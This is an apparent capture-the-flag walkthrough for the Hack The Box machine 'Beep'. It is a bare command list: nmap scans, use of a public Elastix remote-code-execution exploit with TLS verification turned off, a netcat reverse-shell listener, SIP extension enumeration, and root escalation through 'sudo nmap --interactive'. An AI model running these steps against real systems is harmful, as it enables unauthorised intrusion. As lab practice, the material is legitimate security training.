ping 10.10.10.7
whatweb 10.10.10.7

echo "10.10.10.7 beep.htb" >> /etc/hosts

nmap -p- -min-rate 10000 10.10.10.7
nmap -p 22,25,80,110,111,143,443,993,3306,4445,10000 -sCV beep.htb

access site -> uses Elastix

searchsploit elastix
take a look on FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
cp ../exploits/php/webapps/18650.py .
mv 18650.py elastix_rce.py

#terminal 2
nc -nvlp 443

#terminal 1
sudo apt install sipvicious
svwar -m INVITE -e100-999 10.10.10.7 -> get 233

gedit elastix_rce.py
change rhost to "10.10.10.7"
change lhost to your kali ip
change extension to "233"

add lines
----------------------------------------------
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

urllib.urlopen(url, context=ctx)
----------------------------------------------

#terminal 1
python elastix_rce.py

#terminal 2
get shell
ls /home
cat /home/fanis/user.txt

sudo nmap --interactive
!bash
id -> check root
cat /root/root.txt